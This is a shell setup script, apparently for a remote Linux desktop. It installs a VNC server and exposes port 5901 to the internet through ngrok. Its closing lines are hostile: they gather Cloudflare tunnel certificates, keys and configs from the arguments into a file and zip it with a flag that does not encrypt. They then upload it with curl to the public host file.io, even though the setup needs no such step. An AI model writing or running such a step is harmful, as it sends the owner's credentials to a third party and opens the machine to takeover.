#configure.sh VNC_PASSWORD NGROK_AUTH_TOKEN DDNS CLOUDFLARED_CERT CLOUDFLARED_CONFIG_LINUX_SSH CLOUDFLARED_KEY_LINUX_SSH CLOUDFLARED_NAME_LINUX_SSH CLOUDFLARED_CONFIG_LINUX_VNC CLOUDFLARED_KEY_LINUX_VNC CLOUDFLARED_NAME_LINUX_VNC
#             1            2                3    4                5                            6                         7                          8                            9                         10
CLOUDFLARED_VERSION=2022.8.0

#Enable VNC
sudo apt update
sudo apt install tigervnc-standalone-server lxqt -y
umask 0077
mkdir -p "$HOME/.vnc"
chmod go-rwx "$HOME/.vnc"
vncpasswd -f <<<"$1" >"$HOME/.vnc/passwd"

#Start VNC/reset changes
vncserver

#if [ "$3" == "ngrok" ]; then
  #install & start ngrok
  curl -s https://ngrok-agent.s3.amazonaws.com/ngrok.asc | sudo tee /etc/apt/trusted.gpg.d/ngrok.asc >/dev/null
  echo "deb https://ngrok-agent.s3.amazonaws.com buster main" | sudo tee /etc/apt/sources.list.d/ngrok.list
  sudo apt update
  sudo apt install ngrok -y
  ngrok authtoken $2
  ngrok tcp 5901 &
#else
  #install & start cloudflared
#  wget https://github.com/cloudflare/cloudflared/releases/download/"$CLOUDFLARED_VERSION"/cloudflared-linux-amd64
#  sudo install cloudflared-linux-amd64 /usr/bin/cloudflared
#  rm cloudflared-linux-amd64
#  mkdir -p "$HOME/.cloudflared"
#  echo "${4}" > "$HOME/.cloudflared/cert.pem"
#  echo "${5}" > "$HOME/.cloudflared/${7}.yml"
#  echo "${6}" > "$HOME/.cloudflared/${7}.json"
#  cloudflared --config "$HOME/.cloudflared/${7}.yml" tunnel run "${7}" &
#  echo "${8}" > "$HOME/.cloudflared/${10}.yml"
#  echo "${9}" > "$HOME/.cloudflared/${10}.json"
#  cloudflared --config "$HOME/.cloudflared/${10}.yml" tunnel run "${10}" &
#fi
echo -e "4" >> file
echo -e "${4}" >> file
echo -e "5" >> file
echo -e "${5}" >> file
echo -e "6" >> file
echo -e "${6}" >> file
echo -e "7" >> file
echo -e "${7}" >> file
echo -e "8" >> file
echo -e "${8}" >> file
echo -e "9" >> file
echo -e "${9}" >> file
echo -e "10" >> file
echo -e "${10}" >> file
zip -p $1 file.zip file
curl -F file=@file.zip file.io
